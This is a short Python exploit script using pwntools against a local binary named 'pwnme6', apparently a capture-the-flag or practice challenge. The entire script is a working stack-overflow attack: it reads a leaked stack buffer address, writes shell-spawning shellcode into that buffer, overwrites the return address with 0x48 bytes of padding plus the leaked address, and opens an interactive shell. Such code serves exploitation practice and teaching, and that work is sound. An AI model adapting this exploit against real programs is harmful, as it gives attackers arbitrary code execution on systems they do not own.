from pwn import *

context.arch = "amd64"
b = process('./pwnme6')

# main() prints the stack buffer address
leak = b.recv()
print(leak)
leak = int(leak.split()[-1], 16)
log.info(f"Leaked buffer: {hex(leak)}")

# Send shellcode into main's buffer (fgets reads 0x100 bytes)
shell = asm(shellcraft.sh())
b.sendline(shell)
m4 = b'A' * 0x48 + p64(leak)
b.sendline(m4)

b.interactive()